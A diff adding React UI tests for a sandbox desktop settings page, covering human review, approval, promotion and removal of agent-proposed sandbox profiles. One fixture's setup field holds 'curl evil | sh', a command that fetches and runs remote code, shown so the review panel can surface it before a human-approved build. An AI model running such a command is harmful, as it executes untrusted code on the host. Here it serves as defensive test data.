@@ -1,12 +1,16 @@
 import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
-import type { SandboxDesktopStatus } from "shared/types/index.js";
+import type { SandboxAgentProfileSummary, SandboxDesktopStatus } from "shared/types/index.js";
 import SandboxDesktopSettings from "./SandboxDesktopSettings";
 import {
   buildSandboxDesktopImage,
   cancelSandboxBuild,
+  getAgentSandboxProfile,
   getSandboxBuild,
   getSandboxDesktopStatus,
+  getSandboxProfileReview,
+  promoteAgentSandboxProfile,
+  removeAgentSandboxProfile,
   removeSandboxProfile,
   updateSandboxDesktopSettings,
 } from "../../api";
@@ -18,6 +22,10 @@ vi.mock("../../api", () => ({
   removeSandboxProfile: vi.fn(),
   getSandboxBuild: vi.fn(),
   cancelSandboxBuild: vi.fn(),
+  getAgentSandboxProfile: vi.fn(),
+  getSandboxProfileReview: vi.fn(),
+  promoteAgentSandboxProfile: vi.fn(),
+  removeAgentSandboxProfile: vi.fn(),
 }));
 
 function status(overrides: Partial<SandboxDesktopStatus> = {}): SandboxDesktopStatus {
@@ -53,6 +61,9 @@ beforeEach(() => {
   vi.mocked(updateSandboxDesktopSettings).mockReset();
   vi.mocked(buildSandboxDesktopImage).mockReset();
   vi.mocked(removeSandboxProfile).mockReset();
+  vi.mocked(getAgentSandboxProfile).mockReset();
+  vi.mocked(promoteAgentSandboxProfile).mockReset();
+  vi.mocked(removeAgentSandboxProfile).mockReset();
 });
 
 const blender: NonNullable<SandboxDesktopStatus["profiles"]>[number] = {
@@ -134,6 +145,9 @@ describe("Settings → Sandbox desktop", () => {
         profileMaxMemoryMb: 8192,
         profileMaxHomeMb: 4096,
         profileMaxSessionMinutes: 120,
+        agentMaxProfilesPerScope: 5,
+        agentMaxVersions: 10,
+        agentMaxQueuedBuilds: 2,
       }),
     );
   });
@@ -278,7 +292,8 @@ describe("Settings → Sandbox desktop", () => {
     expect(screen.getByTestId("sandbox-profile-test").textContent).toContain("Out of date");
     expect(screen.getByTestId("sandbox-profile-test").textContent).toContain("300 MB");
     fireEvent.click(screen.getByRole("button", { name: "Build profile blender" }));
-    await waitFor(() => expect(buildSandboxDesktopImage).toHaveBeenCalledWith("blender", "global"));
+    // A built-in: one click, no review, no digest.
+    await waitFor(() => expect(buildSandboxDesktopImage).toHaveBeenCalledWith("blender", "global", undefined));
     expect((await screen.findByTestId("sandbox-build-log")).textContent).toContain("Downloading");
     expect(screen.getByText("Building profile blender…")).toBeTruthy();
     // Builds queue (one runs at a time): another can still be asked for, and removing waits only for that profile's own build.
@@ -389,5 +404,331 @@ describe("Settings → Sandbox desktop", () => {
     vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ canEdit: false, profiles: [blender], build: running, builds: [running] }));
     render(<SandboxDesktopSettings />);
     expect(((await screen.findByRole("button", { name: "Cancel the build of the base image" })) as HTMLButtonElement).disabled).toBe(true);
+  });
+
+  describe("agent-built profiles", () => {
+    const scoped: NonNullable<SandboxDesktopStatus["profiles"]>[number] = {
+      ...blender,
+      id: "w0123456789ab/inkscape",
+      scope: "w0123456789ab",
+      name: "inkscape",
+      description: "<b>Inkscape</b> for SVG work.",
+      source: "agent",
+      agent: { version: 3, versions: 3, createdBy: "chat-1", ownerLabel: "workspace Design" },
+      image: { name: "callboard/computer-use-profile:w0123456789ab-inkscape", state: "current" },
+    };
+    const promoted: NonNullable<SandboxDesktopStatus["profiles"]>[number] = {
+      ...scoped,
+      id: "global/gimp",
+      scope: "global",
+      name: "gimp",
+      agent: { version: 2, versions: 2, createdBy: "chat-2", promoted: { at: 1, fromScope: "w0123456789ab", fromVersion: 4 } },
+    };
+    const detail: SandboxAgentProfileSummary = {
+      id: scoped.id,
+      scope: scoped.scope,
+      name: "inkscape",
+      description: "Inkscape",
+      ownerLabel: "workspace Design",
+      current: 3,
+      createdAt: 1,
+      createdBy: "chat-1",
+      versions: [
+        {
+          version: 2,
+          digest: "b",
+          state: "superseded" as const,
+          proposedAt: 2,
+          proposedBy: "chat-1",
+          buildId: "build-2",
+          recipe: '{\n  "name": "inkscape",\n  "packages": ["inkscape"]\n}',
+        },
+        {
+          version: 3,
+          digest: "c",
+          state: "approved" as const,
+          proposedAt: 3,
+          proposedBy: "chat-1",
+          buildId: "build-3",
+          note: "Adds fonts so text renders.",
+          recipe: '{\n  "name": "inkscape",\n  "packages": ["inkscape", "fonts-dejavu"]\n}',
+        },
+        { version: 4, digest: "d", state: "proposed" as const, proposedAt: 4, proposedBy: "chat-1", pending: true, recipe: '{\n  "name": "inkscape"\n}' },
+      ],
+    };
+
+    it("badges agent-built and promoted profiles with their version and owner, as plain text", async () => {
+      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [blender, scoped, promoted] }));
+      render(<SandboxDesktopSettings />);
+      const card = await screen.findByTestId("sandbox-profile-inkscape");
+      expect(screen.getByTestId("sandbox-profile-badge-inkscape").textContent).toContain("agent-built · v3");
+      expect(card.textContent).toContain("Proposed by an agent and approved by a human");
+      expect(card.textContent).toContain("workspace Design");
+      // Agent-written text is never HTML.
+      expect(card.textContent).toContain("<b>Inkscape</b> for SVG work.");
+      expect(card.querySelector("b")).toBeNull();
+      expect(screen.getByTestId("sandbox-profile-badge-gimp").textContent).toContain("promoted from agent · v2");
+      expect(screen.queryByTestId("sandbox-profile-badge-blender")).toBeNull();
+      // Promote only for a non-global scope; agent profiles get Remove, not Remove image.
+      expect(screen.getByRole("button", { name: "Promote profile inkscape to global" })).toBeTruthy();
+      expect(screen.queryByRole("button", { name: "Promote profile gimp to global" })).toBeNull();
+      expect(screen.queryByRole("button", { name: "Remove profile inkscape's image" })).toBeNull();
+      expect(screen.getByRole("button", { name: "Rebuild profile inkscape" })).toBeTruthy();
+    });
+
+    it("hides the agent actions from an API key", async () => {
+      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ canEdit: false, profiles: [scoped] }));
+      render(<SandboxDesktopSettings />);
+      await screen.findByTestId("sandbox-profile-inkscape");
+      expect(screen.queryByRole("button", { name: "History of profile inkscape" })).toBeNull();
+      expect(screen.queryByRole("button", { name: "Promote profile inkscape to global" })).toBeNull();
+      expect(screen.queryByRole("button", { name: "Remove agent profile inkscape" })).toBeNull();
+    });
+
+    it("promotes after confirming, and not when declined", async () => {
+      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [scoped] }));
+      vi.mocked(promoteAgentSandboxProfile).mockResolvedValue({
+        profile: { ...detail, scope: "global", id: "global/inkscape" },
+        image: "callboard/computer-use-profile:inkscape",
+        status: status({ profiles: [{ ...promoted, name: "inkscape", id: "global/inkscape" }] }),
+      });
+      const confirm = vi.spyOn(window, "confirm").mockReturnValueOnce(false).mockReturnValueOnce(true);
+      render(<SandboxDesktopSettings />);
+      fireEvent.click(await screen.findByRole("button", { name: "Promote profile inkscape to global" }));
+      expect(confirm.mock.calls[0]![0]).toMatch(/usable by every chat.*exact image you tested.*relabelled.*nothing is rebuilt/);
+      expect(promoteAgentSandboxProfile).not.toHaveBeenCalled();
+      fireEvent.click(screen.getByRole("button", { name: "Promote profile inkscape to global" }));
+      await waitFor(() => expect(promoteAgentSandboxProfile).toHaveBeenCalledWith("inkscape", "w0123456789ab"));
+      expect((await screen.findByTestId("sandbox-profile-badge-inkscape")).textContent).toContain("promoted from agent");
+    });
+
+    it("removes an agent profile with the agent-profile call after confirming, and shows its error", async () => {
+      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [scoped] }));
+      vi.mocked(removeAgentSandboxProfile).mockRejectedValue(new Error("A container is using that image"));
+      const confirm = vi.spyOn(window, "confirm").mockReturnValue(true);
+      render(<SandboxDesktopSettings />);
+      fireEvent.click(await screen.findByRole("button", { name: "Remove agent profile inkscape" }));
+      expect(confirm.mock.calls[0]![0]).toMatch(/forgets every version/);
+      await waitFor(() => expect(removeAgentSandboxProfile).toHaveBeenCalledWith("inkscape", "w0123456789ab"));
+      expect(removeSandboxProfile).not.toHaveBeenCalled();
+      expect((await screen.findByRole("alert")).textContent).toContain("A container is using that image");
+    });
+
+    it("shows the history newest first, with the agent's note, a recipe and a diff against the previous version", async () => {
+      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [scoped] }));
+      vi.mocked(getAgentSandboxProfile).mockResolvedValue(detail);
+      render(<SandboxDesktopSettings />);
+      fireEvent.click(await screen.findByRole("button", { name: "History of profile inkscape" }));
+      const history = await screen.findByTestId(`sandbox-agent-history-${scoped.id}`);
+      expect(getAgentSandboxProfile).toHaveBeenCalledWith("inkscape", "w0123456789ab");
+      const rows = history.querySelectorAll("[data-testid^='sandbox-agent-version-']");
+      expect([...rows].map((row) => row.getAttribute("data-testid"))).toEqual([4, 3, 2].map((v) => `sandbox-agent-version-${scoped.id}-${v}`));
+      const v4 = screen.getByTestId(`sandbox-agent-version-${scoped.id}-4`);
+      expect(v4.textContent).toContain("card open in chat");
+      expect(v4.textContent).toContain("Proposed, not approved");
+      const v3 = screen.getByTestId(`sandbox-agent-version-${scoped.id}-3`);
+      expect(v3.textContent).toContain("Approved (in force)");
+      expect(v3.textContent).toContain("build build-3");
+      expect(v3.textContent).toContain("The agent's note (its own words, unverified)");
+      expect(v3.textContent).toContain("Adds fonts so text renders.");
+      // The oldest kept version has nothing to diff against.
+      expect(screen.queryByRole("button", { name: /^Diff v2 against/ })).toBeNull();
+      fireEvent.click(screen.getByRole("button", { name: "View the recipe of v2" }));
+      expect(screen.getByTestId(`sandbox-agent-version-${scoped.id}-2`).querySelector("pre")!.textContent).toContain('"packages": ["inkscape"]');
+      fireEvent.click(screen.getByRole("button", { name: "Diff v3 against v2" }));
+      const diff = screen.getByTestId(`sandbox-agent-diff-${scoped.id}-3`);
+      // The fields other than setup, as JSON, line by line.
+      const added = [...diff.querySelectorAll("[data-op='add']")] as HTMLElement[];
+      const fonts = added.find((row) => row.textContent!.includes('"fonts-dejavu"'))!;
+      expect(fonts.textContent!.startsWith("+ ")).toBe(true);
+      expect(fonts.style.color).toBe("var(--diff-added-text)");
+      expect(fonts.style.background).toBe("var(--diff-added-bg)");
+      expect(diff.querySelector("[data-op='same']")!.textContent).toBe("  {");
+    });
+
+    it("lists proposals with no approved version, with history and remove", async () => {
+      const unapproved: SandboxAgentProfileSummary = {
+        ...detail,
+        id: "fdeadbeef0123/krita",
+        scope: "fdeadbeef0123",
+        name: "krita",
+        current: undefined,
+        ownerLabel: "folder /home/me/art",
+      };
+      unapproved.versions = [{ version: 1, digest: "a", state: "refused" as const, proposedAt: 1, proposedBy: "chat-3" }];
+      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [scoped], agentProfiles: [{ ...detail, versions: [] }, unapproved] }));
+      vi.mocked(removeAgentSandboxProfile).mockResolvedValue({ removedImage: false, status: status({ profiles: [scoped], agentProfiles: [] }) });
+      vi.mocked(getAgentSandboxProfile).mockResolvedValue(unapproved);
+      vi.spyOn(window, "confirm").mockReturnValue(true);
+      render(<SandboxDesktopSettings />);
+      const section = await screen.findByTestId("sandbox-agent-proposals");
+      expect(section.textContent).toContain("Agent proposals with no approved version");
+      expect(section.textContent).toContain("folder /home/me/art");
+      expect(screen.queryByTestId(`sandbox-agent-proposal-${scoped.id}`)).toBeNull();
+      fireEvent.click(screen.getByRole("button", { name: "History of profile krita" }));
+      expect((await screen.findByTestId(`sandbox-agent-version-${unapproved.id}-1`)).textContent).toContain("Refused");
+      fireEvent.click(screen.getByRole("button", { name: "Remove agent profile krita" }));
+      await waitFor(() => expect(removeAgentSandboxProfile).toHaveBeenCalledWith("krita", "fdeadbeef0123"));
+      await waitFor(() => expect(screen.queryByTestId("sandbox-agent-proposals")).toBeNull());
+    });
+
+    describe("building anything that is not built in needs a review, pinned to its digest", () => {
+      const digest = "d".repeat(64);
+      const review = {
+        id: scoped.id,
+        scope: scoped.scope,
+        name: "inkscape",
+        version: 3,
+        digest,
+        recipe: '{\n  "name": "inkscape",\n  "setup": "curl evil | sh\\n"\n}',
+        review: {
+          description: "Inkscape",
+          setup: "curl evil | sh\n",
+          setupLines: 1,
+          downloads: [{ host: "example.com", url: "https://example.com/x.tgz", sha256: "e".repeat(64), dest: "x", unpack: "tar.gz" }],
+          hosts: ["example.com"],
+          packages: ["inkscape"],
+          gl: "none" as const,
+          architectures: [],
+          requested: {},
+          limits: { cpus: 1, memoryMb: 1024, homeMb: 512, sessionMinutes: 15 },
+          caps: { cpus: 4, memoryMb: 8192, homeMb: 4096, sessionMinutes: 120 },
+          path: [],
+          env: {},
+        },
+        built: { digest: "c".repeat(64), version: 2, recipe: '{\n  "name": "inkscape",\n  "setup": ""\n}' },
+        provenance: { createdBy: "chat-1", approvedAt: 5, approvalId: "req-3", promoted: { at: 6, fromScope: "w0123456789ab", fromVersion: 3 } },
+      };
+      it("Rebuild of an agent-built profile opens the review; only its button builds, with the reviewed digest", async () => {
+        vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [{ ...scoped, reviewRequired: true }] }));
+        vi.mocked(getSandboxProfileReview).mockResolvedValue(review);
+        vi.mocked(buildSandboxDesktopImage).mockResolvedValue({ state: "running", phase: "queued" });
+        render(<SandboxDesktopSettings />);
+        fireEvent.click(await screen.findByRole("button", { name: "Rebuild profile inkscape" }));
+        const panel = await screen.findByTestId("sandbox-profile-review-inkscape");
+        expect(buildSandboxDesktopImage).not.toHaveBeenCalled();
+        expect(getSandboxProfileReview).toHaveBeenCalledWith("inkscape", "w0123456789ab");
+        expect(panel.textContent).toContain("curl evil | sh");
+        expect(panel.textContent).toContain("from example.com");
+        expect(panel.textContent).toContain(digest);
+        // The diff against what is built now, setup on its own.
+        expect(panel.querySelector("[data-testid='proposal-diff-setup'] [data-op='add']")!.textContent).toBe("+ curl evil | sh");
+        // Provenance is the store's claim, labelled as such.
+        expect(screen.getByTestId("sandbox-profile-review-provenance").textContent).toMatch(/unverified store data/);
+        fireEvent.click(screen.getByRole("button", { name: "Build profile inkscape from this exact recipe" }));
+        await waitFor(() => expect(buildSandboxDesktopImage).toHaveBeenCalledWith("inkscape", "w0123456789ab", digest));
+      });
+      it("Cancel builds nothing", async () => {
+        vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [{ ...scoped, reviewRequired: true }] }));
+        vi.mocked(getSandboxProfileReview).mockResolvedValue(review);
+        render(<SandboxDesktopSettings />);
+        fireEvent.click(await screen.findByRole("button", { name: "Rebuild profile inkscape" }));
+        await screen.findByTestId("sandbox-profile-review-inkscape");
+        fireEvent.click(screen.getByRole("button", { name: "Cancel" }));
+        expect(screen.queryByTestId("sandbox-profile-review-inkscape")).toBeNull();
+        expect(buildSandboxDesktopImage).not.toHaveBeenCalled();
+      });
+      it("an unverified global profile is badged with its image state, and says what is known — not that it was planted", async () => {
+        const forged = {
+          ...promoted,
+          name: "office",
+          id: "global/office",
+          unverified: true as const,
+          reviewRequired: true as const,
+          image: { name: "x:office", state: "missing" as const },
+        };
+        vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [forged] }));
+        vi.mocked(getSandboxProfileReview).mockResolvedValue({
+          ...review,
+          id: "global/office",
+          scope: "global",
+          name: "office",
+          unverified: true,
+          imageState: "missing",
+          built: undefined,
+        });
+        render(<SandboxDesktopSettings />);
+        expect((await screen.findByTestId("sandbox-profile-unverified-office")).textContent).toBe("unverified · Not built");
+        const text = screen.getByTestId("sandbox-profile-unverified-text-office").textContent!;
+        expect(text).toMatch(/No image Callboard built for this global profile exists now \(never built here, image removed, or needs a rebuild: not built\)/);
+        expect(text).toMatch(/Its file can.t be trusted on its own: agents don.t see it and it can.t start until you review and build it/);
+        expect(text).not.toMatch(/never (built or )?promoted|no promotion/i);
+        fireEvent.click(screen.getByRole("button", { name: "Build profile office" }));
+        expect((await screen.findByTestId("sandbox-profile-review-unverified")).textContent).toMatch(/No image Callboard built for it exists now.*: missing/);
+      });
+      it("a promoted profile whose image went insecure says so in its badge", async () => {
+        const stale = { ...promoted, unverified: true as const, reviewRequired: true as const, image: { name: "x:gimp", state: "insecure" as const } };
+        vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [stale] }));
+        render(<SandboxDesktopSettings />);
+        expect((await screen.findByTestId("sandbox-profile-unverified-gimp")).textContent).toMatch(/^unverified · /);
+        expect(screen.getByTestId("sandbox-profile-unverified-gimp").textContent).not.toBe("unverified · Not built");
+      });
+      it("a built-in file that is not the shipped recipe is flagged, and needs the review", async () => {
+        const dropped = {
+          ...blender,
+          id: "global/zz-review-evil",
+          name: "zz-review-evil",
+          builtinProblem: "unknown" as const,
+          reviewRequired: true as const,
+          unverified: true as const,
+        };
+        const modified = { ...blender, builtinProblem: "modified" as const, reviewRequired: true as const };
+        vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [dropped, modified] }));
+        vi.mocked(getSandboxProfileReview).mockResolvedValue({ ...review, id: "global/blender", scope: "global", name: "blender", builtinProblem: "modified" });
+        render(<SandboxDesktopSettings />);
+        expect((await screen.findByTestId("sandbox-profile-builtin-problem-zz-review-evil")).textContent).toBe("not shipped with Callboard");
+        expect(screen.getByTestId("sandbox-profile-builtin-problem-blender").textContent).toBe("not the shipped recipe");
+        fireEvent.click(screen.getByRole("button", { name: /^(Build|Rebuild) profile blender$/ }));
+        expect((await screen.findByTestId("sandbox-profile-review-builtin-problem")).textContent).toMatch(
+          /differs from the recipe this Callboard version shipped/,
+        );
+        expect(buildSandboxDesktopImage).not.toHaveBeenCalled();
+      });
+      it("says plainly that code execution brings the Docker socket", async () => {
+        vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [blender] }));
+        render(<SandboxDesktopSettings />);
+        expect((await screen.findByTestId("sandbox-docker-socket-note")).textContent).toMatch(/Docker access is root access.*code execution.*consent/);
+      });
+    });
+
+    it("edits the agent caps within their bounds", async () => {
+      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status());
+      vi.mocked(updateSandboxDesktopSettings).mockResolvedValue(status({ settings: { agentMaxProfilesPerScope: 0 } }));
+      render(<SandboxDesktopSettings />);
+      const perScope = (await screen.findByLabelText("Agent profiles per workspace/folder (0: agents may not propose)")) as HTMLInputElement;
+      expect([perScope.value, perScope.min, perScope.max]).toEqual(["5", "0", "50"]);
+      const versions = screen.getByLabelText("Versions kept per agent profile (the oldest not in force are dropped)") as HTMLInputElement;
+      expect([versions.value, versions.min, versions.max]).toEqual(["10", "2", "50"]);
+      const queued = screen.getByLabelText("Agent builds queued at once, across all chats") as HTMLInputElement;
+      expect([queued.value, queued.min, queued.max]).toEqual(["2", "1", "10"]);
+      fireEvent.change(perScope, { target: { value: "0" } });
+      fireEvent.change(versions, { target: { value: "20" } });
+      fireEvent.change(queued, { target: { value: "3" } });
+      fireEvent.click(screen.getByRole("button", { name: "Save" }));
+      await waitFor(() =>
+        expect(updateSandboxDesktopSettings).toHaveBeenCalledWith(
+          expect.objectContaining({ agentMaxProfilesPerScope: 0, agentMaxVersions: 20, agentMaxQueuedBuilds: 3 }),
+        ),
+      );
+    });
+
+    it("labels a build an agent requested", async () => {
+      const agentBuild = {
+        state: "succeeded" as const,
+        id: "44444444-4444-4444-4444-444444444444",
+        kind: "profile" as const,
+        phase: "succeeded" as const,
+        profile: "inkscape",
+        profileId: scoped.id,
+        requestedBy: { kind: "agent" as const, chatId: "chat-1", approvalId: "req-1" },
+        version: 3,
+        requestedAt: 5,
+      };
+      const humanBuild = { ...agentBuild, id: "55555555-5555-5555-5555-555555555555", requestedBy: { kind: "human" as const }, version: undefined };
+      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [scoped], builds: [agentBuild, humanBuild] }));
+      render(<SandboxDesktopSettings />);
+      expect((await screen.findByTestId(`sandbox-build-${agentBuild.id}`)).textContent).toContain("requested by an agent, approved by a human (v3)");
+      expect(screen.getByTestId(`sandbox-build-${humanBuild.id}`).textContent).not.toContain("requested by an agent");
+    });
   });
 });
